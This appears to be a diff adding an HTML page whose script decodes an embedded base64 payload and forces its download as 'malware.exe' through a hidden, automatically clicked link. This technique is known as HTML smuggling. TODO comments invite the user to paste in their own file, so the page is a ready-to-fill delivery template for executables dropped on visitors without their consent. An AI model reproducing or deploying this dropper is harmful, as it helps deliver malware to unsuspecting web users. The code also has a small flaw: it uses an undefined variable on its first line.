@@ -1,0 +1,41 @@
+<html>
+    <body>
+            <script>
+var blob = new Blob([data], {type: 'octet/stream'});
+
+function base64ToArrayBuffer(base64)
+{
+var binary_string = window.atob(base64);
+var len = binary_string.length;
+var bytes = new Uint8Array( len );
+for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
+return bytes.buffer;
+}
+// TODO: replace with the output of `base64 $FILE | tr -d '\n'`
+var file = 'AAaAAAAAAAAAAAAA//AAAAaAAAAAAAAAAAAAAA...';
+//TODO: Replace with the filename you want it saved as
+var fileName = 'malware.exe';
+
+
+var data = base64ToArrayBuffer(file);
+var blob = new Blob([data], { type: 'octet/stream'});
+
+if (window.navigator.msSaveOrOpenBlob) {
+    window.navigator.msSaveBlob(blob,fileName);
+} else {
+    var a = document.createElement('a');
+    document.body.appendChild(a);
+    // make it invisible
+    a.style = 'display: none';
+    // Create a URL for the blob data
+    var url = window.URL.createObjectURL(blob);
+    a.href = url;
+    a.download = fileName;
+    // Click the object
+    a.click()
+    window.URL.revokeObjectURL(url);
+}
+      </script>
+        <!-- Add Any Code Here -->
+    </body>
+</html>
